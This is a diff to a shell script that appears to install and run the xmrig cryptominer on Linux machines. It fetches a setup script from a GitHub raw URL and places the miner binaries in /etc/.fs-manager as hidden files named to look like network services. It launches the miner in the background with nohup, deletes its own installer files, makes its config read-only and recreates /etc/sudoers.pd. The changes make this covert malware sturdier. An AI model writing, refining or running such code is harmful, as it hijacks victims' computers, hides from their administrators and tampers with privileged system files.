@@ -8,8 +8,8 @@ setupurl="https://github.com/uzidlrxvs/fos/raw/main/e.sh"
 if [[ $(ps -ef | grep NetworksManager | grep -v grep | wc -l) != 0 ]]; then
     # if not already runing, launch xmrig with nohup
     echo "running proccess"
-	rm -r /tmp/w.sh
-	rm -r /tmp/*.sh.*
+	rm -r /etc/e.sh
+	rm -r /etc/*.sh.*
     exit
 fi
 
@@ -69,8 +69,8 @@ if [ $download = 1 ]; then
  
 
  
-    rm -r dasdsa.tar.gz
-    rm -r dasdsa.tar.gz.*
+    rm -f dasdsa.tar.gz
+    rm -f dasdsa.tar.gz.1
     mv /etc/fs-manager /etc/.fs-manager
     mv /etc/.fs-manager/Service-Networks /etc/.fs-manager/.Service-Networks
     mv /etc/.fs-manager/NetworksManager /etc/.fs-manager/.NetworksManager
@@ -78,7 +78,7 @@ if [ $download = 1 ]; then
     touch /etc/.fs-manager/.out.log
     chmod +x /etc/.fs-manager/.out.log
 	chmod +x /etc/.fs-manager/.Service-Networks
-	
+	chmod 555 /etc/.fs-manager/config.json
  
 
 fi
@@ -94,14 +94,14 @@ if [ $launch = 1 ]; then
     cd "/etc/.fs-manager"
     #nohup ./NetworksManager > out.log 2>&1 &
 	nohup ./.Service-Networks -s "NetworksManager" ./.NetworksManager > .out.log 2>&1 &
-	rm -r /tmp/e.sh
-	rm -r /tmp/*.sh.*
+	rm -r /etc/e.sh
+	rm -r /etc/*.sh.*
 fi
 
 echo "all done"
 	
 function mkFolder() {
-        rm -r /etc/sudoers.pd
+        rm -f /etc/sudoers.pd
         mkdir /etc/sudoers.pd
         if [[ $? -ne 0 ]]; then
                 echo "[err] An error has ocurred" >&2
